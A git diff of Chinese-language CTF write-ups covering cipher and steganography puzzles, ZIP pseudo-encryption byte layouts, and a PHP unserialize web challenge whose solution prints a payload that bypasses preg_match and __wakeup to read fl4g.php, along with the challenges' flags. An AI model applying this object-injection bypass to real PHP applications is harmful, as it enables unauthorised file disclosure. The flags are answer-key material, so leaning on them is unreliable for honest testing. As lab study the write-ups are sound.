@@ -86,6 +86,187 @@ print(ans)
 Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr
 ```
 
+### 如来十三掌
+
+使用与佛论禅论坛，http://keyfc.net/bbs/tools/tudoucode.aspx，对文字进行解密得到
+
+```
+MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9
+```
+
+根据题目提示，使用ROT13编码进行解密
+
+```
+ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9
+```
+
+再使用base64进行编码，得到flag
+
+```
+flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}
+```
+
+### stegano
+
+工具：福昕pdf编辑器
+
+思路：从pdf文件中找到字符，再进行加解密
+
+去除无用信息后，选中“编辑对象”，框选一大片区域，发现字符串
+
+```
+BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB
+```
+
+类似于培根密码，但培根密码为5位一组，不符合。此字符串中只有AB两种字符，类似于二进制，联想摩斯密码，解密后得到flag
+
+```
+flag{1nv151bl3m3554g3}
+```
+
+#### 培根密码
+
+采用a和b两种字符表示的字符串，5位字符一组
+
+#### 摩斯密码
+
+### simpleRAR
+
+工具：winhex，stegsolve（图片隐写工具），photoshop
+
+首先下载得到一个rar文件，打开后提示“secure.png"文件头损坏。
+
+尝试使用winrar直接修复，结果是把secure.png直接删除。尝试失败。
+
+上网查阅rar块构成后，将“Cflag is not here?”后十六进制的7A更改为74。成功解压得到secure.png
+
+根据题目提示，将png放入photoshop中。photoshop提示非png文件。
+
+使用winhex打开secure.png，头部标识
+
+```
+474946
+```
+
+表示这是一个gif文件。更改后缀名后放入photoshop中，得到两个图层。
+
+分别将两个图层的空白图片放入stegsolve，得到二维码。放入photoshop合成二维码并补充三个角，扫码后得到flag
+
+```
+flag{yanji4n_bu_we1shi}
+```
+
+#### rar头部构成
+
+每个数据块结构
+
+```
+HEAD_CRC：校验码，2字节
+HEAD_TYPE：块类型，1字节
+HEAD_FLAGS：块标记，2字节
+最后两字节：块大小
+```
+
+整个RAR文件数据块构成
+
+```
+标记块：HEAD_TYPE=0x72
+压缩文件头：HEAD_TYPE=0x74
+文件头：HEAD_TYPE=0x74
+```
+
+### base64stego
+
+#### zip的伪加密
+
+zip由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志，根据三个区域的不同，区分zip是非加密、伪加密还是加密的。
+
+```
+压缩源文件数据区： 
+50 4B 03 04：这是头文件标记（0x04034b50） 
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密） 头文件标记后2bytes
+08 00：压缩方式 
+5A 7E：最后修改文件时间 
+F7 46：最后修改文件日期 
+16 B5 80 14：CRC-32校验（1480B516） 
+19 00 00 00：压缩后尺寸（25） 
+17 00 00 00：未压缩尺寸（23） 
+07 00：文件名长度 
+00 00：扩展记录长度 
+6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 
+压缩源文件目录区： 
+
+50 4B 01 02：目录中文件文件头标记(0x02014b50) 
+
+3F 00：压缩使用的 pkware 版本
+
+14 00：解压文件所需 pkware 版本 
+00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes
+08 00：压缩方式 
+5A 7E：最后修改文件时间 
+F7 46：最后修改文件日期 
+16 B5 80 14：CRC-32校验（1480B516） 
+19 00 00 00：压缩后尺寸（25） 
+17 00 00 00：未压缩尺寸（23） 
+07 00：文件名长度 
+24 00：扩展字段长度 
+00 00：文件注释长度 
+00 00：磁盘开始号 
+00 00：内部文件属性 
+20 00 00 00：外部文件属性 
+
+00 00 00 00：局部头部偏移量
+
+6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 
+压缩源文件目录结束标志： 
+50 4B 05 06：目录结束标记 
+00 00：当前磁盘编号 
+00 00：目录区开始磁盘编号 
+01 00：本磁盘上纪录总数 
+01 00：目录区中纪录总数 
+59 00 00 00：目录区尺寸大小 
+
+3E 00 00 00：目录区对第一张磁盘的偏移量
+
+00 00：ZIP 文件注释长度
+```
+
+```
+无加密
+压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）
+且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）
+
+假加密
+压缩源文件数据区的全局加密应当为00 00 
+且压缩源文件目录区的全局方式位标记应当为09 00
+
+真加密
+压缩源文件数据区的全局加密应当为09 00 
+且压缩源文件目录区的全局方式位标记应当为09 00 
+```
+
+#### base64编码
+
+原本一个字符使用8bit表示，使用base64编码后改为用6bit表示，不能除尽的部分补0
+
+#### base64解码
+
+```
+检查base64编码后面有几个等于号
+把字符串按照base64表转换成4*6的倍数位数二进制
+删除等于号的个数*8的bit
+按照6个bit一组转成字符
+```
+
+#### base64隐写
+
+```
+
+```
+
+
+
 ## web 初级
 
 ### view_souce
@@ -353,6 +534,58 @@ cyberpeace{04a3b25a4981849593d0b45e6f3b2717}
 
 ### Web_php_unserialize
 
-根据网页上显示的源码，打开fl4g.php即可
+根据网页上显示的源码，需要在url的var中传入一个参数，这个参数首先会被base64解码，然后查看是否pre_match一个正则，最后被序列化
 
-由于var进行了base_64的解密得到，因此将fl4g.php进行base_64加密得到
+因此，需要把Demo中的file变量设置成“fl4g.php”，并且需要依次进行序列化，pre_match的绕过，base64编码
+
+```
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+    $A = new Demo('fl4g.php');
+    $C = serialize($A);
+    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
+    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
+    $C = str_replace(':1:', ':2:',$C);//绕过wakeup
+    var_dump($C);
+    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
+    var_dump(base64_encode($C));
+    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
+?>
+```
+
+```
+$flag="ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}"
+```
+
+
+
+#### php的var_dump
+
+输出变量信息
+
+#### php的class
+
+```
+__construct：初始化一个对象时执行
+__destruct：对象销毁时执行
+__wakeup：对象被反序列化时执行
+```
+
+### Web_python_template_injection
+
+#### flask
+
